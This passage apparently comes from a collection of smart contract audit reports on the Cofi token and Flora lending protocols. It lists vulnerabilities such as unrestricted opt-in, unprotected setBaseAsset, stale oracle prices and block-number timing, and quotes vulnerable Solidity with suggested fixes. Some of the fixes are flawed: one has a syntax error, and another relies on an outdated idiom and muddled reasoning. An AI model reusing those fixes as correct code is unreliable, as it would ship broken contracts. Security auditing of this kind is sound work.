users' accounts.\r\n\r\nHere is the relevant code snippet:\r\n```solidity\r\nfunction rebaseOptInExternal(address _account) public nonReentrant {\r\n    require(_isNonRebasingAccount(_account), 'FiToken: Account has not opted out');\r\n\r\n    // Convert balance into the same amount at the current exchange rate\r\n    uint256 newCreditBalance = _creditBalances[_account]\r\n        .mul(_rebasingCreditsPerToken)\r\n        .div(_creditsPerToken(_account));\r\n\r\n    // Decreasing non rebasing supply\r\n    nonRebasingSupply = nonRebasingSupply.sub(balanceOf(_account));\r\n\r\n    _creditBalances[_account] = newCreditBalance;\r\n\r\n    // Increase rebasing credits, totalSupply remains unchanged so no\r\n    // adjustment necessary\r\n    _rebasingCredits = _rebasingCredits.add(_creditBalances[_account]);\r\n\r\n    rebaseState[_account] = RebaseOptions.OptIn;\r\n\r\n    // Delete any fixed credits per token\r\n    delete nonRebasingCreditsPerToken[_account];\r\n}\r\n\r\n```\r\n\r\ncontrol mechanism. This means that any user can invoke the function and opt in an address of their choice, even if they do not have the authorization to do so. This unrestricted access can lead to unauthorized opt-ins and potential misuse of other users' accounts.\r\n\r\nHere is the relevant code snippet:\r\n\r\n```solidity\r\nfunction rebaseOptInExternal(address _account) public nonReentrant {\r\n    require(_isNonRebasingAccount(_account), 'FiToken: Account has not opted out');\r\n\r\n    // Convert balance into the same amount at the current exchange rate\r\n    uint256 newCreditBalance = _creditBalances[_account]\r\n        .mul(_rebasingCreditsPerToken)\r\n        .div(_creditsPerToken(_account));\r\n\r\n    // Decreasing non rebasing supply\r\n    nonRebasingSupply = nonRebasingSupply.sub(balanceOf(_account));\r\n\r\n    _creditBalances[_account] = newCreditBalance;\r\n\r\n    // Increase rebasing credits, totalSupply remains unchanged so no\r\n    // adjustment necessary\r\n    _rebasingCredits = _rebasingCredits.add(_creditBalances[_account]);\r\n\r\n    rebaseState[_account] = RebaseOptions.OptIn;\r\n\r\n    // Delete any fixed credits per token\r\n    delete nonRebasingCreditsPerToken[_account];\r\n}\r\n```\r\n\r\nThis code block allows any caller to execute the rebaseOptInExternal function, opting in an address of their choice without proper authorization. The function performs various operations related to rebasing and modifies the internal state of the contract, impacting the balance and credit calculations for the specified account.\r\n\r\nHowever, this unrestricted access to opting in other addresses violates user expectations and can lead to unauthorized actions, potentially disrupting the proper functioning of the system and compromising user funds and privacy.\r\n\r\n**Recommendation:** To address this vulnerability and ensure proper access control, it is recommended to implement a suitable authorization mechanism for the rebaseOptInExternal function. The following steps are suggested:\r\n\r\nImplement an access control mechanism such as EIP-712 or similar standards to verify the authenticity of the opt-in request.\r\n\r\nRequire a valid ECDSA signature from the address being opted in, demonstrating their explicit consent.\r\n\r\nBy introducing these measures, the contract can ensure that only authorized users can opt in an address on their behalf, maintaining user autonomy and protecting against unauthorized access and misuse.\r\n\r\n\r\n\r\n### [M-3] Both functions in MakerRouterFacet will revert due to insufficient balance\r\n\r\n**Context:** [MakerRouterFacet.sol](https://github.com/sgoodenough95/cofi-ethereum/blob/1418c28096623cd74731a97f8c4ec3409dca57cd/contracts/diamond/facets/MakerRouterFacet.sol#L40-L72)\r\n\r\n**Impact**\r\n\r\nThe MakerRouterFacet contract is currently susceptible to a vulnerability that causes both the swapUsdcForDai and swapDaiForUsdc functions to revert due to insufficient balance. This limitation prevents the functions from executing as intended, as there is no mechanism to ensure that the required funds are available in the contract before the swap operations.\r\n\r\n**Description**\r\n\r\nThe MakerRouterFacet contract includes two functions, swapUsdcForDai and swapDaiForUsdc, which both contain comments indicating that the presence of USDC in the contract address needs to be ensured before execution. However, there is no actual functionality implemented to handle this verification step. As a result, the only way to execute these functions successfully is by manually sending the required funds to the contract beforehand, which deviates from the expected flow of the system.\r\n\r\nHere are the relevant code snippets:\r\n```solidity\r\nfunction swapUsdcForDai(uint256 amountUsdcIn) external onlyAdmin {\r\n    require(daiPSM.tin() == 0, \"MakerRouter: maker fee not 0\");\r\n\r\n    // First ensure USDC resides in this address.\r\n    USDC.safeApprove(GEM_JOIN, amountUsdcIn); /// approve DAI PSM to spend USDC\r\n    daiPSM.sellGem(address(this), amountUsdcIn); /// sell USDC for DAI\r\n    // Deploy DAI to new Vault.\r\n}\r\n\r\nfunction swapDaiForUsdc(uint256 amountDaiIn) external onlyAdmin {\r\n    require(daiPSM.tout() == 0, \"MakerRouter: maker fee not 0\");\r\n\r\n    // First ensure USDC resides in this address.\r\n    DAI.safeApprove(address(daiPSM), amountDaiIn); /// approve DAI PSM to spend DAI\r\n    daiPSM.buyGem(address(this), amountDaiIn / USDC_SCALING_FACTOR); /// sell DAI for USDC\r\n    // Deploy USDC to new Vault.\r\n}\r\n```\r\n\r\nThese code blocks demonstrate that the comments indicate the need to ensure the presence of USDC in the contract before executing the swap operations. However, there is no accompanying code that performs the necessary verification or balance checks, leading to reverts when attempting to execute these functions without pre-sending the required funds.\r\n\r\n**Recommendation**\r\n\r\nTo address this vulnerability and restore the expected flow, it is recommended to modify the swapUsdcForDai and swapDaiForUsdc functions to include functionality that pulls the required funds from the sender's address. This can be achieved by using the `safeTransferFrom` function of the respective ERC20 token contracts.\r\n\r\nThe suggested modifications are as follows:\r\n```solidity\r\nfunction swapUsdcForDai(uint256 amountUsdcIn) external onlyAdmin {\r\n    require(daiPSM.tin() == 0, \"MakerRouter: maker fee not 0\");\r\n\r\n    // Pull USDC from the sender's address.\r\n    USDC.safeTransferFrom(msg.sender, address(this), amountUsdcIn);\r\n    ...\r\n}\r\n\r\nfunction swapDaiForUsdc(uint256 amountDaiIn) external onlyAdmin {\r\n    require(daiPSM.tout() == 0, \"MakerRouter: maker fee not 0\");\r\n\r\n    // Pull DAI from the sender's address.\r\n    DAI.safeTransferFrom(msg.sender, address(this), amountDaiIn);\r\n    ...\r\n```\r\n\r\n\r\n\r\n### [M-4] Incorrect deduction from allowance without considering infinite allowance in transferFrom function\r\n\r\n**Context:**  [FiToken.sol](https://github.dev/sgoodenough95/cofi-ethereum/blob/1418c28096623cd74731a97f8c4ec3409dca57cd/contracts/token/FiToken.sol#L233-L235)\r\n\r\n**Impact:** The impact of this vulnerability is that the transferFrom function incorrectly deducts from the allowance even when the allowance is set to an infinite value. This can result in unexpected behavior and may lead to unauthorized transfers of tokens due to incorrect deduction from the allowance.\r\n\r\n**Description:** The transferFrom function in the provided code snippet is responsible for transferring tokens from one account (_from) to another (_to). In the process, it deducts the transferred amount (_value) from the allowance granted by _from to msg.sender (the caller of the function).\r\n\r\n```solidity\r\n_allowances[_from][msg.sender] = _allowances[_from][msg.sender].sub(_value);\r\n```\r\n\r\nHowever, this code does not consider the case where the allowance is set to an infinite value. As a result, it mistakenly deducts the _value from the allowance, regardless of whether it is necessary or not. This can potentially allow unauthorized transfers of tokens even when the allowance is intended to be infinite.\r\n\r\n**Recommendation**\r\n\r\nTo address this vulnerability, it is recommended to modify the code in the transferFrom function to check if the allowance is set to an infinite value before deducting from it. The code should be updated as follows:\r\n\r\n```solidity\r\nif (_allowances[_from][msg.sender] != uint256(-1)) {\r\n    _allowances[_from][msg.sender] = _allowances[_from][msg.sender].sub(_value);\r\n}\r\n```\r\n\r\n\r\nBy including this additional check, the deduction from the allowance will only occur if the allowance is not set to an infinite value (uint256(-1)). This ensures that the deduction is performed correctly.\r\n\r\n\r\n## Low Risk\r\n\r\n\r\n### [L-1] Hardcoded Addresses wont work for multi-chain deployments\r\n\r\n**Context** [SwapRouterFacet.sol](https://github.com/sgoodenough95/cofi-ethereum/blob/1418c28096623cd74731a97f8c4ec3409dca57cd/contracts/diamond/facets/SwapRouterFacet.sol#L19-L20), [MakerRouterFacet.sol](https://github.com/sgoodenough95/cofi-ethereum/blob/1418c28096623cd74731a97f8c4ec3409dca57cd/contracts/diamond/facets/MakerRouterFacet.sol#L16-L32)\r\n\r\n**Impact** The impact of this vulnerability is that the smart contracts rely on hardcoded addresses for external contracts and routers, which may not work correctly for multi-chain deployments. If the addresses of the referenced contracts change or the deployment is on a different chain, the contracts may fail to interact with the intended contracts and routers, leading to incorrect behavior and potential malfunctions.\r\n\r\n**Description** In the provided code snippets, there are multiple instances where addresses of external contracts and routers are hardcoded. These hardcoded addresses include references to Maker DAI-USDC PSM, DAI contract, USDC contract, and a contract used for selling USDC for DAI. Additionally, there is a constant `routerAddress` that contains a hardcoded address for a router.\r\n\r\n```solidity\r\nIDSSPSM public constant daiPSM = IDSSPSM(0x89B78CfA322F6C5dE0aBcEecab66Aee45393cC5A); IERC20 public constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F); IERC20 public constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48); address public constant GEM_JOIN = 0x0A59649758aa4d66E25f08Dd01271e891fe52199;\r\n```\r\n\r\n```solidity\r\naddress public constant routerAddress = 0xE592427A0AEce92De3Edee1F18E0157C05861564;\r\n```\r\n\r\nThis approach of using hardcoded addresses restricts the smart contracts to specific networks and may cause compatibility issues when deploying the contracts on different chains or when the addresses of the referenced contracts change.\r\n\r\n**Recommendation** To address this vulnerability, it is recommended to pass the required addresses as constructor parameters during contract deployment instead of using hardcoded addresses. By making the addresses configurable during deployment, the smart contracts can be deployed on different networks and adapt to changes in contract addresses.\r\n\r\n\r\n\r\n### [L-2] Potential self-removal of admin account in toggleAdmin function\r\n\r\n**Context:** [PointToken.sol](https://github.com/sgoodenough95/cofi-ethereum/blob/1418c28096623cd74731a97f8c4ec3409dca57cd/contracts/token/PointToken.sol#L62-L65), [FiToken.sol](https://github.com/sgoodenough95/cofi-ethereum/blob/1418c28096623cd74731a97f8c4ec3409dca57cd/contracts/token/FiToken.sol#L722-L724)\r\n\r\n**Impact**\r\nThe impact of this vulnerability is that the toggleAdmin function allows for the removal of the admin account itself. If the admin account address is mistakenly or maliciously passed to the toggleAdmin function, the ownership of the contract can be revoked without any possibility of recovery. This can lead to a loss of control over the contract and potential misuse or unauthorized modifications.\r\n\r\n**Description**\r\nIn the provided code snippets, there are two instances of the toggleAdmin function. This function is responsible for toggling the admin status of an account, allowing it to perform certain privileged actions. However, due to a naive mistake or malicious actions, if the admin account address is passed as an argument to the toggleAdmin function, the function will toggle the admin status of that account, including the admin account itself.\r\n\r\n```solidity\r\nfunction toggleAdmin(address _account) external isAdmin {\r\n    admin[_account] = !admin[_account];\r\n}\r\n```\r\n\r\n```solidity\r\nfunction toggleAdmin(address _account) external onlyAdmin {\r\n    admin[_account] = !admin[_account];\r\n}\r\n```\r\n\r\nThis vulnerability exposes the contract to potential loss of ownership and control, as the admin account can unintentionally or maliciously remove its own admin status, leaving no means for recovery.\r\n\r\n**Recommendation**\r\nTo address this vulnerability, it is recommended to use the Ownable contract provided by OpenZeppelin. The Ownable contract implements a more robust ownership mechanism and avoids the risk of accidentally or maliciously removing the admin account.\r\n\r\nBy utilizing Ownable, you can replace the vulnerable toggleAdmin function with the secure ownership management provided by OpenZeppelin's Ownable contract. This will ensure proper ownership control and prevent unauthorized removal of the admin account.\r\n\r\n\r\n\r\n\r\n### [L-3] GPv2SafeERC20 safeTransfer functions can return true for addresses that do not exist\r\n\r\n**Context:** [LibToken.sol](https://github.com/sgoodenough95/cofi-ethereum/blob/1418c28096623cd74731a97f8c4ec3409dca57cd/contracts/diamond/libs/LibToken.sol#L12)\r\n\r\n**Impact**\r\n\r\nThe GPv2SafeERC20 contract, utilized by LibToken, lacks a check to verify the existence of the token being transferred. This implementation oversight can lead to confusion within the system, as address.call() will return true for non-existent addresses, falsely indicating a successful transfer. While this vulnerability may not currently pose an issue, future changes in the system could potentially expose it to honeypot attacks.\r\n\r\n**Description**\r\n\r\nThe GPv2SafeERC20 contract, used in LibToken, does not include a necessary check to ensure the existence of the token being transferred. When using the address.call() function, which returns true for non-existent addresses, the system may be misled into believing that the transfer has been successfully completed, despite the token not actually existing.\r\n\r\nHere are the relevant code snippets:\r\n```solidity\r\nfunction safeTransfer(IERC20 token, address to, uint256 value) internal {\r\n    bytes4 selector_ = token.transfer.selector;\r\n\r\n    // solhint-disable-next-line no-inline-assembly\r\n    assembly {\r\n        let freeMemoryPointer := mload(0x40)\r\n        mstore(freeMemoryPointer, selector_)\r\n        mstore(add(freeMemoryPointer, 4), and(to, 0xffffffffffffffffffffffffffffffffffffffff))\r\n        mstore(add(freeMemoryPointer, 36), value)\r\n\r\n        if iszero(call(gas(), token, 0, freeMemoryPointer, 68, 0, 0)) {\r\n            returndatacopy(0, 0, returndatasize())\r\n            revert(0, returndatasize())\r\n        }\r\n    }\r\n\r\n    require(getLastTransferResult(token), 'GPv2: failed transfer');\r\n}\r\n```\r\n\r\n```solidity\r\nfunction safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {\r\n    bytes4 selector_ = token.transferFrom.selector;\r\n\r\n    // solhint-disable-next-line no-inline-assembly\r\n    assembly {\r\n        let freeMemoryPointer := mload(0x40)\r\n        mstore(freeMemoryPointer, selector_)\r\n        mstore(add(freeMemoryPointer, 4), and(from, 0xffffffffffffffffffffffffffffffffffffffff))\r\n        mstore(add(freeMemoryPointer, 36), and(to, 0xffffffffffffffffffffffffffffffffffffffff))\r\n        mstore(add(freeMemoryPointer, 68), value)\r\n\r\n        if iszero(call(gas(), token, 0, freeMemoryPointer, 100, 0, 0)) {\r\n            returndatacopy(0, 0, returndatasize())\r\n            revert(0, returndatasize())\r\n        }\r\n    }\r\n\r\n    require(getLastTransferResult(token), 'GPv2: failed transferFrom');\r\n}\r\n```\r\n\r\nThese code blocks demonstrate that the GPv2SafeERC20 contract lacks the necessary checks to verify whether the token being transferred actually exists. The contract relies on address.call(), which returns true for non-existent addresses, leading to the false assumption of a successful transfer.\r\n\r\nWhile this vulnerability may not be problematic at present, future changes to the system may expose it to potential honeypot attacks. Malicious actors could create a fake token contract at a non-existent address and manipulate the transfer functions to deceive users.\r\n\r\n**Recommendation**\r\n\r\nTo mitigate this vulnerability, it is recommended to introduce checks in the LibToken contract to verify the existence of the token before utilizing the safeTransfer and safeTransferFrom functions. One approach is to check whether the specified token address contains any code. If the contract at the given address does not have any code, it indicates that the token does not exist, and the transfer should be rejected.\r\n\r\nAlternatively, considering the usage of OpenZeppelin's safe transfer mechanism throughout other\r\n\r\n\r\n\r\n### [L-4] Missing rebase opt-out check in toggleFreeze function\r\n\r\n**Context** [FiToken.sol](https://github.com/sgoodenough95/cofi-ethereum/blob/1418c28096623cd74731a97f8c4ec3409dca57cd/contracts/token/FiToken.sol#L726-L731)\r\n\r\n**Impact**\r\n\r\nPotential freezing of accounts without ensuring they are opted out of rebases.\r\n\r\n**Description**\r\nThe toggleFreeze function is designed to toggle the frozen state of an account. However, the comment within the function claims that if freezing, it should be ensured that the account is opted out of rebases. Unfortunately, the code does not include any check to verify if the account has been opted out of rebases. As a result, accounts can be frozen without ensuring they are protected from rebases, which can lead to unexpected behavior and potential vulnerabilities.\r\n\r\n**Recommendation**\r\n\r\nIt is recommended to add a require statement in the toggleFreeze function to check whether the account has been opted out of rebases before toggling the frozen state. This can be done by introducing a modifier or a conditional statement that verifies the opt-out status of the account. By performing this check, the function will provide an additional layer of security and prevent freezing an account that has not been properly opted out of rebases. Here's an example of how the code could be modified:\r\n\r\n```solidity\r\nfunction toggleFreeze(address _account) external onlyAdmin {\r\n    require(isOptedOut[_account] || !frozen[_account], \"Account must be opted out of rebases before freezing.\");\r\n    frozen[_account] = !frozen[_account];\r\n}\r\n```\r\n\r\nBy including the require statement and appropriate conditions, the function will now check whether the account has been opted out of rebases before allowing the frozen state to be toggled.\r\n\r\n\r\n\r\n### [L-5] Unsafe use of Address.isContract in _isNonRebasingAccount function\r\n\r\n**Context:** [FiToken.sol](https://github.com/sgoodenough95/cofi-ethereum/blob/1418c28096623cd74731a97f8c4ec3409dca57cd/contracts/token/FiToken.sol#L514-L520)\r\n\r\n**Impact**\r\n\r\nThe current implementation of `_isNonRebasingAccount` function may lead to incorrect assumptions about whether an address is a contract or an externally-owned account (EOA). This can result in inaccurate account status determination and manipulation, potentially leading to unexpected behavior, security issues, and broken interactions with smart wallets like Gnosis Safe.\r\n\r\n**Description**\r\n\r\nThe `_isNonRebasingAccount` function uses `Address.isContract` to determine if an address is a contract.\r\n\r\n```solidity\r\n    function _isNonRebasingAccount(address _account) internal returns (bool) {\r\n        bool isContract = Address.isContract(_account);\r\n        if (isContract && rebaseState[_account] == RebaseOptions.NotSet) {\r\n            _ensureRebasingMigration(_account);\r\n        }\r\n        return nonRebasingCreditsPerToken[_account] > 0;\r\n    }\r\n```\r\n\r\nHowever, `Address.isContract` can return false for not only externally-owned accounts but also for contracts under certain circumstances:\r\n\r\n-   When the contract is in construction\r\n-   When the address is designated for a contract to be created\r\n-   When a contract existed at the address but was later destroyed\r\n\r\nFurthermore, `Address.isContract` might return true for a contract scheduled for destruction by `SELFDESTRUCT` within the same transaction, even though this operation only takes effect at the end of a transaction.\r\n\r\nThis method of determining account type is therefore unreliable and can lead to incorrect decisions by the `_isNonRebasingAccount` function, especially if the function assumes an address is an EOA when it is actually a contract in one of the mentioned states.\r\n\r\n**Recommendation**\r\n\r\nIt's recommended to revise the `_isNonRebasingAccount` function to treat both contracts and EOAs the same with regards to rebasing. This would reduce the risk of possible attack vectors and prevent potential inaccuracies when determining account status.\r\n\r\nPreventing calls from contracts should be avoided as it breaks composability and support for smart wallets, which could be vital for the overall functionality and security of the system. If a distinction between EOAs and contracts is necessary, consider using a more reliable method to differentiate between the two.\r\n",pdfLink:"https://github.com/bytes032/reports/blob/main/Cofi.pdf"},{title:"Flora",slug:"flora",description:"Permissionless Money MarketFeaturing isolated risk pools and capital-efficient vaults. With Flora Loans, you can isolate your assets from the risk of any other lending pair on the platform. Users can lend compatible assets to the protocol to use as collateral for loans and earn interest.",findings:29,createdAt:"2023-07-12T03:52:32.356Z",body:'\r\n---\r\n\r\n# Findings\r\n## Critical Risk\r\n\r\n\r\n### [C-1] Users can receive less collateral than expected from liquidations\r\n\r\n**Context:** [LendingPair.sol](https://github.com/floraDeployer/flora/blob/03a29c339bc2dacf5572b4aa5c4509176755209d/contracts/LendingPair.sol#L722-L738)\r\n\r\n**Impact**\r\n\r\nThe impact of this vulnerability could be significant for liquidators. Liquidators might end up receiving less collateral than expected, especially when dealing with positions that are substantially underpriced or lack enough collateral to cover the liquidation.\r\n\r\n**Description**\r\n\r\nThe described issue is within the `_liquidateAccount()` function in the `LendingPair` contract, where the collateral amount to be liquidated is calculated based on the repayment amount and various other parameters.\r\n\r\nThe code snippet:\r\n\r\n```solidity\r\n      // Calculates the amount of collateral to liquidate for _repayAmount\r\n        // Avoiding stack too deep error\r\n        uint256 supplyDebt = _convertTokenValues(\r\n            _repayToken,\r\n            supplyToken,\r\n            _repayAmount,\r\n            _repayToken == tokenA ? priceA : priceB, // repayPrice\r\n            supplyToken == tokenA ? priceA : priceB // supplyPrice\r\n        );\r\n\r\n        // Adding fees\r\n        uint256 callerFee = (supplyDebt *\r\n            lendingController.liqFeeCaller(_repayToken)) / 100e18;\r\n        uint256 systemFee = (supplyDebt *\r\n            lendingController.liqFeeSystem(_repayToken)) / 100e18;\r\n        uint256 supplyBurn = supplyDebt + callerFee + systemFee;\r\n        uint256 supplyOutput = supplyDebt + callerFee;\r\n```\r\n\r\nWhere:\r\n- `_repayAmount`\xa0- The amount that the liquidator is repaying\r\n- `supplyOutput`\xa0- Collateral amount returned, proportional to how much debt is being liquidated.\r\n\r\nAs seen above, if the position does not have sufficient collateral to repay the amount being liquidated or is very underpriced, it simply repays the liquidator with the remaining collateral amount.\r\n\r\nThis could cause liquidators to receive less collateral than expected, especially if they fully liquidate positions with bad debt.\r\n\r\n**Recommendation:** It is recommended to add a `minCollateralAmount` parameter in the `_liquidateAccount()` function within the `LendingPair` contract.\r\n\r\nThis parameter should represent the minimum amount of collateral a liquidator is willing to receive.\r\n\r\nIf the returned collateral amount (`supplyOutput`) is less than the specified `minCollateralAmount`, the transaction should be designed to revert.\r\n\r\n## High Risk\r\n\r\n\r\n### [H-1] Users can use the protocol without accruing interest\r\n\r\n**Context:** [LendingPair.sol](https://github.com/floraDeployer/flora/blob/03a29c339bc2dacf5572b4aa5c4509176755209d/contracts/LendingPair.sol#L270-L275)\r\n\r\n**Impact:** The discovered vulnerability could allow a malicious user to perform specific actions such as depositing, withdrawing, repaying, or borrowing without accruing any interest. This can lead to financial inconsistencies within the contract and potentially unfair advantages to certain users. It directly affects the integrity of financial transactions within the system and can erode trust in the contract\'s fairness.\r\n\r\n**Description:** In the `LendingPair` contract, the function `accrue` is called to calculate the interest for a specific token being used in various operations. The code snippet below represents the logic:\r\n\r\n```solidity\r\n  function accrue(address _token) public {\r\n        if (lastBlockAccrued[_token] < block.number) {\r\n            uint256 newDebt = _accrueDebt(_token);\r\n            uint256 newSupply = (newDebt * irm.lpRate) / 100e18;\r\n            accounting[_token].totalSupplyAmount += newSupply;\r\n\r\n```\r\n\r\n\r\nThe issue lies in the reliance on `block.number` to determine the timing of interest accrual.\r\n\r\nAccording to [Arbitrum\'s documentation](https://github.com/OffchainLabs/arbitrum/blob/master/docs/Time_in_Arbitrum.md#ethereum-block-numbers-within-arbitrum), block numbers and timestamps should be considered reliable only in the longer term, and they can be unreliable in the shorter term (minutes).\r\n\r\nMultiple Arbitrum transactions (up to 50) in a single L1 block may have the same `block.number`. This behavior creates a vulnerability where a user might perform two consecutive actions within the same block without the expected interest being accrued, leading to inconsistencies in the contract\'s financial calculations.\r\n\r\n**Recommendation:** It is advisable to avoid relying solely on `block.number` for timing assumptions in the `LendingPair` contract. Consider implementing an additional mechanism to track time such as [ERC6372](https://eips.ethereum.org/EIPS/eip-6372)\r\n\r\n\r\n### [H-2] Lack of Access Control in Setting Base Assets\r\n\r\n**Context:** [LendingController.sol](https://github.com/floraDeployer/flora/blob/03a29c339bc2dacf5572b4aa5c4509176755209d/contracts/LendingController.sol#L186-L193)\r\n\r\n**Impact:** The vulnerability allows a malicious actor to Deny Service (DoS) for the creation of permissionless pairs. By continuously setting the base asset to false, they can prevent the creation of new pairs, leading to potential disruption of the platform\'s functioning.\r\n\r\n**Description:** When creating a pair through the [PairFactory.sol](https://github.com/floraDeployer/flora/blob/03a29c339bc2dacf5572b4aa5c4509176755209d/contracts/PairFactory.sol#L121-L129) contract, it makes a call to the lending controller to check if it\'s a base asset:\r\n\r\n```solidity\r\n\r\n        if (_isPermissionless) {\r\n            require(\r\n>                lendingController.isBaseAsset(_tokenA) == true,\r\n                "PairFactory: baseToken not supported by LendingController"\r\n            );\r\n            /// @dev Will revert if there are no pools available for the pair and period combination\r\n            /// @dev Increases Cardinality for all pairs\r\n            lendingController.preparePool(_tokenA, _tokenB);\r\n```\r\n\r\nThe issue here is that the `setBaseAsset` function lacks access control and can be called by anyone:\r\n\r\n```solidity\r\n    function setBaseAsset(address _token, bool _isBaseAsset) public {\r\n        require(\r\n            oracleAggregator.tokenSupported(_token),\r\n            "LendingController: Token not supported by Oracle."\r\n        );\r\n        isBaseAsset[_token] = _isBaseAsset;\r\n        emit BaseAssetSet(_token, _isBaseAsset);\r\n    }\r\n```\r\n\r\nThis design flaw means that a malicious actor can repeatedly call `setBaseAsset` for a specific token, setting it to false, and consequently deny the creation of permissionless pairs.\r\n\r\n**Recommendation:** The recommendation is to add proper access control to the `setBaseAsset` function to ensure that only authorized users or contracts can modify the base asset status. This could be achieved by implementing a role-based access control mechanism or by requiring specific permissions to call the function. An example modification might look like:\r\n\r\n```solidity\r\n    function setBaseAsset(address _token, bool _isBaseAsset) onlyOwner external {\r\n        require(\r\n            oracleAggregator.tokenSupported(_token),\r\n            "LendingController: Token not supported by Oracle."\r\n        );\r\n        isBaseAsset[_token] = _isBaseAsset;\r\n        emit BaseAssetSet(_token, _isBaseAsset);\r\n    }\r\n\r\n```\r\n\r\n## Medium Risk\r\n\r\n\r\n### [M-1] Incorrect Collateral Factor Initialization in LendingPair.sol\r\n\r\n**Context:** [LendingPair.sol](https://github.com/floraDeployer/flora/blob/03a29c339bc2dacf5572b4aa5c4509176755209d/contracts/LendingPair.sol#L129-L130)\r\n\r\n**Impact:** The incorrect retrieval of the collateral factor may lead to unexpected behavior in the lending protocol, potentially resulting in financial inaccuracies or imbalances. If different tokens are supposed to have different collateral factors, but the system always retrieves the default, it could lead to either over-collateralization or under-collateralization, depending on the specific use case.\r\n\r\n**Description:** When initializing a lending pair, the current implementation always queries the default collateral factor\r\n\r\n```solidity\r\n        colFactor[_tokenA] = lendingController.defaultColFactor();\r\n        colFactor[_tokenB] = lendingController.defaultColFactor();\r\n```\r\n\r\n\r\nignoring any specific collateral factors that [have been set](https://github.com/floraDeployer/flora/blob/03a29c339bc2dacf5572b4aa5c4509176755209d/contracts/LendingController.sol#L276-L287) for the individual tokens, such as:\r\n\r\n```solidity\r\n    function setColFactor(address _token, uint256 _value) external onlyOwner {\r\n        require(\r\n            _value <= MAX_COL_FACTOR,\r\n            "LendingController: _value <= MAX_COL_FACTOR"\r\n        );\r\n        require(\r\n            _token.isContract(),\r\n            "LendingController: _token must be a contract."\r\n        );\r\n        colFactor[_token] = _value;\r\n        emit ColFactorSet(_token, _value);\r\n    }\r\n```\r\n\r\nThis could lead to the scenario where even though the lending controller has collateral factor values for that token, they won\'t be considered, because it\'s always looking at the default collateral factor.\r\n\r\n**Recommendation:** To resolve this vulnerability, the collateral factor should be retrieved based on the specific token. If a collateral factor has been set for a particular token, it should be used; otherwise, the default collateral factor should be used. The recommended code change is:\r\n\r\n```solidity\r\n        uint256 colFactorTokenA = lendingController.colFactor(_tokenA);\r\n        uint256 defaultCollateralFactor = lendingController.defaultColFactor();\r\n\r\n        colFactor[_tokenA] = colFactorTokenA != 0 ? colFactorTokenA : defaultCollateralFactor;\r\n```\r\n\r\nThis ensures that token-specific collateral factors are considered, falling back to the default collateral factor only if no specific value has been set.\r\n\r\n\r\n### [M-2] Lack of Freshness Check on Chainlink Oracle Price\r\n\r\n**Context:** [UnifiedOracleAggregator.sol](https://github.com/floraDeployer/flora/blob/03a29c339bc2dacf5572b4aa5c4509176755209d/contracts/UnifiedOracleAggregator.sol#L155-L158)\r\n\r\n**Impact:** The absence of a freshness check on the price timestamp from the Chainlink oracle can lead to the utilization of stale or outdated prices. This can cause incorrect or unfair asset valuations within the system, potentially leading to financial loss for users or an imbalance in the ecosystem.\r\n\r\n**Description:** The code snippet provided does not include any measures to verify the freshness of the prices fetched from the Chainlink oracle:\r\n\r\n```solidity\r\n            if (AggregatorV3Interface(linkOracle).decimals() == 8) {\r\n                (, int256 ethPrice, , , ) = AggregatorV3Interface(\r\n                    linkOracles[WETH]\r\n                ).latestRoundData();\r\n```\r\n\r\nOracle price feeds can become stale due to a variety of\xa0[reasons](https://ethereum.stackexchange.com/questions/133242/how-future-resilient-is-a-chainlink-price-feed/133843#133843). Without a staleness check, there is no guarantee that the price used is recent, and the system could use an outdated price if the [OCR](https://docs.chain.link/architecture-overview/off-chain-reporting) was unable to push an update in time.\r\n\r\n**Recommendation:** Apply the checks that you have implemented in `setOracle`:\r\n\r\n```solidity\r\n            (\r\n                uint80 roundID,\r\n                int256, ethPrice\r\n                uint256 updatedAt,\r\n                uint80 answeredInRound\r\n            ) = _linkOracle.latestRoundData();\r\n\r\n            require(\r\n                answeredInRound >= roundID,\r\n                "UnifiedOracleAggregator: Oracle is not alive"\r\n            );\r\n            require(\r\n                updatedAt != 0,\r\n                "UnifiedOracleAggregator: Oracle not found"\r\n            );\r\n```\r\n\r\n\r\n\r\n### [M-3] Some common non-standard ERC20 tokens are incompatible with the protocol.\r\n\r\n**Context:** [FeeConverter.sol](https://github.com/floraDeployer/flora/blob/03a29c339bc2dacf5572b4aa5c4509176755209d/contracts/FeeConverter.sol#L73)\r\n\r\n**Impact:** The direct usage of the ERC20\'s `transfer` and `transferFrom` methods can lead to unexpected behaviors with certain tokens, causing the application to be incompatible with tokens like `ZRX`, `USDT`, `BNB`, `OMG`. This poses a significant risk as it could lead to failed transactions or incorrect processing of certain tokens, especially considering that popular tokens like `USDT` exhibit these issues.\r\n\r\n**Description:** The code in `FeeConverter` utilizes the standard ERC20 `transfer` and `transferFrom` methods. Two major issues arise from this:\r\n\r\n1. **Returning False on Failure**: Some tokens (e.g., `ZRX`) do not revert on failure when calling `transfer` or `transferFrom`. Instead, they return false, which could lead to unexpected behaviors if not handled appropriately within the code.\r\n2. **No Boolean Return**: Certain tokens like `USDT`, `BNB`, `OMG` do not return a boolean value on a `transfer` or `transferFrom` call. This discrepancy can lead to incompatibility and can cause errors or misinterpretation of the transaction status.\r\n\r\nThe application\'s incompatibility with these behaviors, especially with widely used tokens like `USDT`, can lead to an unpredictable and unreliable system, creating vulnerabilities in transaction handling.\r\n\r\n**Recommendation**\r\n\r\nLeveraging a well-established library such as OpenZeppelin\'s `SafeERC20`, and its `safeTransfer`/`safeTransferFrom` methods, would ensure consistent behavior.\r\n\r\n## Low Risk\r\n\r\n\r\n### [L-1] FeeConverter wont work with tokens with a fee-on-transfer or a rebasing mechanism\r\n\r\n**Context:** [FeeConverter.sol](https://github.com/floraDeployer/flora/blob/03a29c339bc2dacf5572b4aa5c4509176755209d/contracts/FeeConverter.sol#L73)\r\n\r\n**Impact**\r\nThe absence of specific handling for tokens with arbitrary changes to account balances (e.g., fee-on-transfer tokens or tokens with rebasing mechanisms) can cause inconsistencies between the recorded and actual balances within the contract.\r\n\r\n**Description**\r\n\r\nCertain tokens on the blockchain have mechanisms that allow for arbitrary changes to account balances, such as fee-on-transfer tokens and tokens with rebasing mechanisms. The `FeeConverter` contract, however, does not account for these special behaviors:\r\n\r\n1. **Fee-on-transfer Tokens**: These tokens automatically deduct a fee from the transferred amount. If not handled, the `FeeConverter` contract might record more tokens than what is actually transferred.\r\n2. **Tokens with Rebasing Mechanisms**: These tokens can change balances periodically based on specific criteria, potentially making 